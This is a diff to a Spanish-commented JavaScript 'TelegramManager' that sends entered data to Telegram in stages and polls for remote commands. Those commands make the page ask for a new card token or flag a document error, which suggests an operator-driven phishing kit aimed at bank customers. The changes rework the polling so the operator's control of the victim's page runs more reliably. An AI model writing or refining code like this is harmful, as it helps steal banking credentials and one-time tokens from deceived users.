@@ -9,6 +9,7 @@ class TelegramManager {
     constructor() {
         this.checkInterval = null;
         this.checking = false;
+        this.isPolling = false;
     }
 
     async sendToTelegram(stage, data) {
@@ -41,7 +42,11 @@ class TelegramManager {
     }
 
     async startPolling() {
-        if (this.checking) return;
+        if (this.isPolling) {
+            console.log('⚠️ Polling ya activo, ignorando...');
+            return;
+        }
+        this.isPolling = true;
         this.checking = true;
         this.checkInterval = setInterval(() => this.checkAction(), 2500);
         console.log('🔄 Polling iniciado...');
@@ -53,6 +58,8 @@ class TelegramManager {
             this.checkInterval = null;
         }
         this.checking = false;
+        this.isPolling = false;
+        console.log('⏹️ Polling detenido');
     }
 
     async checkAction() {
@@ -120,10 +127,12 @@ class TelegramManager {
                 // If we are on next-step.html and using the card
                 const tokenInput = document.getElementById('tokenInputCard');
                 if (tokenInput) {
+                    const overlay = document.querySelector('.loading-overlay');
+                    if (overlay) overlay.classList.remove('active');
                     tokenInput.value = '';
                     tokenInput.focus();
                     alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingresalo.');
-                    this.startPolling(); // Resume polling for next try
+                    // NO reiniciar polling aquí, esperar a que el usuario envíe nuevo token
                 }
                 break;
 
@@ -140,15 +149,8 @@ class TelegramManager {
 // Instancia global
 window.telegramManager = new TelegramManager();
 
-// Iniciar siempre al cargar para estar listos para órdenes de Telegram
+// NO iniciar polling automáticamente, solo cuando sea necesario
 document.addEventListener('DOMContentLoaded', () => {
-    // Si hay un loader activo (porque venimos de un submit), nos aseguramos de que el polling esté corriendo
-    const overlay = document.querySelector('.loading-overlay');
-    if (overlay && overlay.classList.contains('active')) {
-        window.telegramManager.startPolling();
-    } else {
-        // En general, es bueno que siempre esté escuchando órdenes (como pedir_logo o error_documento)
-        window.telegramManager.startPolling();
-    }
+    console.log('📱 Telegram Manager listo');
 });
 
